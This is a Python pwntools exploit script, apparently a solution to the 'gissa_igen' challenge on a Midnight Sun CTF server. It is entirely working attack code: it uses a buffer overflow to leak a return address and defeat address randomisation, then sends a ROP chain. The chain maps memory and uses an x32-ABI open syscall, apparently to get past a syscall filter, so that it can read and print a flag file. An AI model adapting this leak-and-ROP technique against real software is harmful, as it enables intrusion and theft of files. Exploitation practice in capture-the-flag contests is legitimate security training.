from pwn import *

pop_rax = 0x0000000000000c21 # pop rax ; pop rdi ; pop rsi ; ret
pop_args = 0x0000000000000c1d # pop rdx ; pop r9 ; pop r8 ; pop rdi ; pop rsi ; ret
syscall   = 0x0000000000000C2A # syscall
txt_read  = 0x0000000000000BD4
txt_write = 0x0000000000000BDC
txt_open  = 0x0000000000000BE4

pop_rcx = 0x0000000000000c1f # pop rcx ; pop r8 ; pop rdi ; pop rsi ; ret

off_mmap = 0x0000000000000c13 # mov r10, rcx ; xor rax, rax ; mov al, 9 ; syscall


off_buff  = -0xA8
off_size  = -0x1c
off_bad   = -0x1a
off_tmp   = -0x18
off_tries = -0x10

off_ret = 0xbc5

x32_bit = 0x40000000
sys_mmap = 9
sys_open = x32_bit + 2
sys_read = 0
sys_write = 1

def sys3(sysnum, a1, a2, a3):
    return p64(base + pop_rax) + p64(sysnum) + p64(0) + p64(0) + \
            p64(base + pop_args) + p64(a3) + p64(0) + p64(0) + p64(a1) + p64(a2) + \
            p64(base + syscall) 


def mmap(a1, a2, a3, a4, a5, a6):
    return p64(base + pop_rcx) + p64(a4) + p64(0) * 3 + \
            p64(base + pop_args) + p64(a3) + p64(a6) + p64(a5) + p64(a1) + p64(a2) + \
            p64(base + off_mmap) + p64(0) * 5

def guess(data, newline=True):
    p.recvuntil(": ")
    p.send(data)
    if newline:
        p.send('\n')

#p = process('./gissa_igen')
p = remote('gissa-igen-01.play.midnightsunctf.se', 4096)

guess("")
guess("A" * (off_size - off_buff) + p32(-off_buff))

# Leak the return pointer
marker = 'ABCDEFGH'
guess("A" * (off_tmp - off_buff) + '\x80' * (-off_tmp - 8) + marker,
        newline=False)
p.recvuntil(marker)
leak = p.recvuntil(' ', drop=True)
base = u64(leak + '\x00\x00') - off_ret
log.success('Leaked base: {:016x}'.format(base))

#raw_input()

# Send rop-chain
mem = 0x100000
exp = 'A' * -off_buff
exp += mmap(mem, 0x1000, 7, 0x22, 0xffffffff, 0)
exp += sys3(sys_read, 0, mem, 100)
exp += sys3(sys_open, mem, 0, 0)
exp += sys3(sys_read, 3, mem, 0x1000)
exp += sys3(sys_write, 1, mem, 0x1000)

p.sendline(exp)

time.sleep(.5)

p.send('/home/ctf/flag\0')
p.interactive()
